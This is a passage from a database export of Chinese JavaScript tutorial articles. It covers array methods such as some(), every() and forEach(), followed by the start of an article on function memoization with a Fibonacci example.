class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(n){\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (n %2 ===0){\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e n\n  }\n}).map(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(n){\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e n*n\n})//[4,16,36,64]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e先调用filter()获得所有偶数，再调用map()获得所有偶数平方和\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e5.7 some()，every()\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003esome() 方法测试数组中的某些元素是否通过由提供的函数实现的测试。\n传入的参数也是一个callback()函数，callback 被调用时传入三个参数：元素的值，元素的索引，被遍历的数组。其实一般只要发现时传入callback()函数，基本都是这些参数。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(5) [1, 3, 4, 10, 30, notNumber: \u003cspan class=\"hljs-string\"\u003e\"not a number\"\u003c/span\u003e]\n    0: 1\n    1: 3\n    2: 4\n    3: 10\n    4: 30\n    notNumber: \u003cspan class=\"hljs-string\"\u003e\"not a number\"\u003c/span\u003e\n    length: 5\n    __proto__: Array(0)\narr.some(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value, index){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e index \u0026gt; 5\n})\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\narr.some(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value, index){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e index \u0026gt; 3\n})\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003esome()方法的作用是只要数组中的\u003cstrong\u003e某个元素满足传入的函数的要求就返回true\u003c/strong\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eevery() 方法测试数组的所有元素是否都通过了指定函数的测试。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [1, 2, 3, 4, 5];\narr.every(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (elem, index, arr) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e elem \u0026gt;= 3;\n});\n// \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eevery()是要求数组的\u003cstrong\u003e所有元素都满足传入的函数的要求才返回true\u003c/strong\u003e。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e注意\u003c/strong\u003e：对于空数组，some方法返回false，every方法返回true，回调函数都不会执行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e isEven(x) { \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e x % 2 === 0 }\nundefined\n\n[].every(isEven)\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n[].some(isEven)\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对上面的结果，我又有什么办法呢，只能选择背过呗。\n\u003cstrong\u003e这两个方法都不改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e6. 上述数组的方法的使用总结\u003c/h3\u003e\n\u003cp\u003e数组的上述方法种类繁多，不过有几个特点很明显，一些方法会改变原数组，一些方法不会改变原数组，我以这个细节把上述方法分类如下\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e6.1 改变原数组的方法\u003c/h4\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e方法名字\u003c/th\u003e\n\u003cth\u003e方法作用\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003epush()\u003c/td\u003e\n\u003ctd\u003e在元素末尾添加元素，\u003cstrong\u003e返回添加新元素后的数组长度\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003epop()\u003c/td\u003e\n\u003ctd\u003e删除数组末尾的元素，\u003cstrong\u003e返回删除的那个元素\u003c/strong\u003e。与push()方法一起模拟栈这个数据结构\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eshift()\u003c/td\u003e\n\u003ctd\u003e删除数组的第一个元素，\u003cstrong\u003e返回删除的那个元素\u003c/strong\u003e。与push()方法结合，模拟队列这个数列这个数据结构\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eunshift()\u003c/td\u003e\n\u003ctd\u003e在数组的起始位置添加新元素，\u003cstrong\u003e返回添加新元素后的数组长度\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ereverse()\u003c/td\u003e\n\u003ctd\u003e把数组的每一个元素的位置互换，\u003cstrong\u003e返回翻转后的数组\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esplice()\u003c/td\u003e\n\u003ctd\u003e根据方法传入的参数删除原数组的部分元素，\u003cstrong\u003e返回被删除的元素。可以用来拆分数组\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eindexOf()，lastIndexOf()\u003c/td\u003e\n\u003ctd\u003e返回括号里面 的元素第一次出现和最后一次出现的位置。NaN元素无法获得位置\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esort()\u003c/td\u003e\n\u003ctd\u003e默认按照数组元素的Unicode码点排序，可以自己传入函数，规定排序准则\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch4 class=\"heading\"\u003e6.2 不改变原数组的方法\u003c/h4\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e方法名字\u003c/th\u003e\n\u003cth\u003e方法作用\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003ejoin()\u003c/td\u003e\n\u003ctd\u003e以某种形式把数组的所有元素以字符串的形式返回，默认以逗号分隔，\u003cstrong\u003e返回生成的新数组\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003econcat()\u003c/td\u003e\n\u003ctd\u003e专业合并数组，把新数组添加到旧数组的后面，\u003cstrong\u003e返回生成的新数组\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eslice()\u003c/td\u003e\n\u003ctd\u003e根据方法传入的参数提取原数组的部分，\u003cstrong\u003e返回提取的这个新数组\u003c/strong\u003e。\u003cstrong\u003e也可以用来把伪数组变成真数组\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003emap()\u003c/td\u003e\n\u003ctd\u003e必须传入一个callback()函数，数组的每一个元素执行这个函数，\u003cstrong\u003e返回执行回调函数后的新数组\u003c/strong\u003e。该方法会跳过\u003cstrong\u003e空位\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eforEach()\u003c/td\u003e\n\u003ctd\u003e必须传入一个callback()函数，数组的每一个元素执行这个函数。\u003cstrong\u003e没有返回值，无法终止循环\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003efilter()\u003c/td\u003e\n\u003ctd\u003e必须传入一个callback()函数，数组的每一个元素执行这个函数，\u003cstrong\u003e返回结果为true的成员组成一个新数组返回\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ereduce()\u003c/td\u003e\n\u003ctd\u003e对数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。\u003cstrong\u003e具体理解看例子吧\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esome()\u003c/td\u003e\n\u003ctd\u003e只要数组中的某个元素满足传入的函数的要求就返回true\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eevery()\u003c/td\u003e\n\u003ctd\u003e数组的所有元素都满足传入的函数的要求才返回true\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e正是因为以上的方法对原数组不造成影响，所以我们可以组合使用filter()、map()先过滤再匹配。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e6.3 数组的遍历\u003c/h4\u003e\n\u003cp\u003e对于有序无序的数据，我们有时候会希望获得所有的key或者value，数组对这个需求尤甚。\n一般来说，数组的遍历有三种方法\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003efor...in循环\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [1, 3, 4, 10, 30]\nundefined\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (var key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e arr){\n\u0009console.log(arr[key])\n}\n1\n3\n4\n10\n30\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e切忌把arr[key]手抖写成了arr.key。因为arr.key等同于arr['key']，很明显数组没有这个名字叫key的键。\nfor...in循环有个弊端就是它会把非数字的索引也打印出来\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(5) [1, 3, 4, 10, 30]\narr.notNumber = \u003cspan class=\"hljs-string\"\u003e'not a number'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"not a number\"\u003c/span\u003e\narr\n(5) [1, 3, 4, 10, 30, notNumber: \u003cspan class=\"hljs-string\"\u003e\"not a number\"\u003c/span\u003e]\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (var key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e arr){\n\u0009console.log(key + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + arr[key])\n}\n0: 1\n1: 3\n2: 4\n3: 10\n4: 30\nnotNumber: not a number\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果我们只关心数组的数字索引，用传统的下面的传统for循环\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e传统for循环\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(5) [1, 3, 4, 10, 30, notNumber: \u003cspan class=\"hljs-string\"\u003e\"not a number\"\u003c/span\u003e]\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; arr.length; i++){\n\u0009console.log(i + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + arr[i])\n}\n0:1\n1:3\n2:4\n3:10\n4:30\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种方法其实是我们人为规定了只遍历数字索引，O(∩_∩)O哈哈~\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eforEach(）循环\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(5) [1, 3, 4, 10, 30, notNumber: \u003cspan class=\"hljs-string\"\u003e\"not a number\"\u003c/span\u003e]\narr.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value, index){\n\u0009console.log(index + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + value)\n})\n0:1\n1:3\n2:4\n3:10\n4:30\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种方法也不会遍历非数字的索引。\u003c/p\u003e\n","buildTime":"1515067224.0957","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c7a"},"id":"59af56a96fb9a0248f4aadb8","author":{"$oid":"5a4b774a85b30d097483e982"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript 专题之函数记忆","meta":{"likeCount":0},"tag":["JavaScript","前端","Underscore.js","jQuery"],"comment":[],"shortContent":" JavaScript 专题系列第十七篇，讲解函数记忆与菲波那切数列的实现 定义 函数记忆是指将上次的计算结果缓存起来，当下次调用时，如果遇到相同的参数，就直接返回缓存中的数据。 举个例子： function add(a, b) { return a + b; } // 假设 m…","content":"\u003cblockquote\u003e\n\u003cp\u003eJavaScript 专题系列第十七篇，讲解函数记忆与菲波那切数列的实现\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"-\"\u003e定义\u003c/h2\u003e\n\u003cp\u003e函数记忆是指将上次的计算结果缓存起来，当下次调用时，如果遇到相同的参数，就直接返回缓存中的数据。\u003c/p\u003e\n\u003cp\u003e举个例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eadd\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a + b;\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// 假设 memorize 可以实现函数记忆\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memoizedAdd = memorize(add);\n\nmemoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// 3\u003c/span\u003e\nmemoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// 相同的参数，第二次调用时，从缓存中取出数据，而非重新计算一次\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-\"\u003e原理\u003c/h2\u003e\n\u003cp\u003e实现这样一个 memorize 函数很简单，原理上只用把参数和对应的结果数据存到一个对象中，调用时，判断参数对应的数据是否存在，存在就返回对应的结果数据。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e第一版\u003c/h2\u003e\n\u003cp\u003e我们来写一版：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 第一版 (来自《JavaScript权威指南》)\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ememoize\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ef\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cache = {};\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e key = \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e.length + \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.prototype.join.call(\u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e cache) {\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache[key]\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache[key] = f.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e)\n    }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们来测试一下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e add = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ea, b, c\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a + b + c\n}\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memoizedAdd = memorize(add)\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.time(\u003cspan class=\"hljs-string\"\u003e'use memorize'\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; \u003cspan class=\"hljs-number\"\u003e100000\u003c/span\u003e; i++) {\n    memoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)\n}\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.timeEnd(\u003cspan class=\"hljs-string\"\u003e'use memorize'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.time(\u003cspan class=\"hljs-string\"\u003e'not use memorize'\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; \u003cspan class=\"hljs-number\"\u003e100000\u003c/span\u003e; i++) {\n    add(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)\n}\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.timeEnd(\u003cspan class=\"hljs-string\"\u003e'not use memorize'\u003c/span\u003e)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 Chrome 中，使用 memorize 大约耗时 60ms，如果我们不使用函数记忆，大约耗时 1.3 ms 左右。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e注意\u003c/h2\u003e\n\u003cp\u003e什么，我们使用了看似高大上的函数记忆，结果却更加耗时，这个例子近乎有 60 倍呢！\u003c/p\u003e\n\u003cp\u003e所以，函数记忆也并不是万能的，你看这个简单的场景，其实并不适合用函数记忆。\u003c/p\u003e\n\u003cp\u003e需要注意的是，函数记忆只是一种编程技巧，本质上是牺牲算法的空间复杂度以换取更优的时间复杂度，在客户端 JavaScript 中代码的执行时间复杂度往往成为瓶颈，因此在大多数场景下，这种牺牲空间换取时间的做法以提升程序执行效率的做法是非常可取的。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e第二版\u003c/h2\u003e\n\u003cp\u003e因为第一版使用了 join 方法，我们很容易想到当参数是对象的时候，就会自动调用 toString 方法转换成 \u003ccode\u003e[Object object]\u003c/code\u003e，再拼接字符串作为 key 值。我们写个 demo 验证一下这个问题：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e propValue = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eobj\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e obj.value\n}\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memoizedAdd = memorize(propValue)\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(memoizedAdd({\u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e})) \u003cspan class=\"hljs-comment\"\u003e// 1\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(memoizedAdd({\u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e})) \u003cspan class=\"hljs-comment\"\u003e// 1\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e两者都返回了 1，显然是有问题的，所以我们看看 underscore 的 memoize 函数是如何实现的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 第二版 (来自 underscore 的实现)\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memorize = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003efunc, hasher\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memoize = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ekey\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cache = memoize.cache;\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e address = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e + (hasher ? hasher.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e) : key);\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!cache[address]) {\n            cache[address] = func.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e);\n        }\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache[address];\n    };\n    memoize.cache = {};\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e memoize;\n};\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e从这个实现可以看出，underscore 默认使用 function 的第一个参数作为 key，所以如果直接使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e add = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ea, b, c\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a + b + c\n}\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memoizedAdd = memorize(add)\n\nmemoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// 6\u003c/span\u003e\nmemoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// 6\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e肯定是有问题的，如果要支持多参数，我们就需要传入 hasher 函数，自定义存储的 key 值。所以我们考虑使用 JSON.stringify：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memoizedAdd = memorize(add, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e args = \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.prototype.slice.call(\u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify(args)\n})\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(memoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)) \u003cspan class=\"hljs-comment\"\u003e// 6\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(memoizedAdd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e)) \u003cspan class=\"hljs-comment\"\u003e// 7\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果使用 JSON.stringify，参数是对象的问题也可以得到解决，因为存储的是对象序列化后的字符串。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e适用场景\u003c/h2\u003e\n\u003cp\u003e我们以斐波那契数列为例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e count = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e fibonacci = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003en\u003c/span\u003e)\u003c/span\u003e{\n    count++;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e n \u0026lt; \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e? n : fibonacci(n\u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e) + fibonacci(n\u003cspan class=\"hljs-number\"\u003e-2\u003c/span\u003e);\n};\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt;= \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e; i++){\n    fibonacci(i)\n}\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(count) \u003cspan class=\"hljs-comment\"\u003e// 453\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们会发现最后的 count 数为 453，也就是说 fibonacci 函数被调用了 453 次！也许你会想，我只是循环到了 10，为什么就被调用了这么多次，所以我们来具体分析下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e当执行 fib(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) 时，调用 \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) 时，调用 \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e 次\n\n当执行 